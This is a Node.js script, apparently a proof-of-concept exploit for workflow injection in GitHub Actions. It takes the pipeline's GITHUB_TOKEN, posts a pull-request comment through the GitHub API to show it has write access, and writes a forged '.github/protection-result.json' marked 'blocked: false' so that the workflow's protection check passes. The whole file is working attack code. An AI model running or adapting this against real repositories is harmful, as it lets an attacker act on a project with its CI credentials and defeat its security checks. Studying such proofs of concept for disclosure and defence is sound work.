#!/usr/bin/env node

const fs = require('fs');
const https = require('https');

// Payload function to post a comment
function pwn() {
  const token = process.env.GITHUB_TOKEN;
  const repo = process.env.GITHUB_REPOSITORY; // e.g., "owner/repo"
  const prNumber = process.env.PR_NUMBER;

  if (!token || !repo || !prNumber) {
    console.error("Missing env vars, running locally?");
    return;
  }

  console.log(`[+] Attacking PR #${prNumber} on ${repo}`);

  const data = JSON.stringify({
    body: "🚩 **POC: Remote Code Execution via Workflow Injection**\n\nI have successfully executed code with `pull-requests: write` permission. I can verify/approve PRs or modify checks."
  });

  const options = {
    hostname: 'api.github.com',
    path: `/repos/${repo}/issues/${prNumber}/comments`,
    method: 'POST',
    headers: {
      'User-Agent': 'node.js',
      'Authorization': `token ${token}`,
      'Content-Type': 'application/json',
      'Content-Length': data.length
    }
  };

  const req = https.request(options, (res) => {
    console.log(`[+] API Response Status: ${res.statusCode}`);
    res.on('data', (d) => process.stdout.write(d));
  });

  req.on('error', (error) => {
    console.error(error);
  });

  req.write(data);
  req.end();
}

// 1. Create the dummy result file to satisfy the next step in YAML
// The YAML expects: JSON.parse(fs.readFileSync('.github/protection-result.json', 'utf8'))
const fakeResult = {
  blocked: false,
  title: "Security Research",
  summary: "Testing vulnerability"
};

// Ensure directory exists (just in case, though likely exists)
if (!fs.existsSync('.github')) {
  fs.mkdirSync('.github');
}

fs.writeFileSync('.github/protection-result.json', JSON.stringify(fakeResult));
console.log("[+] Fake result written to .github/protection-result.json");

// 2. Execute the attack
pwn();
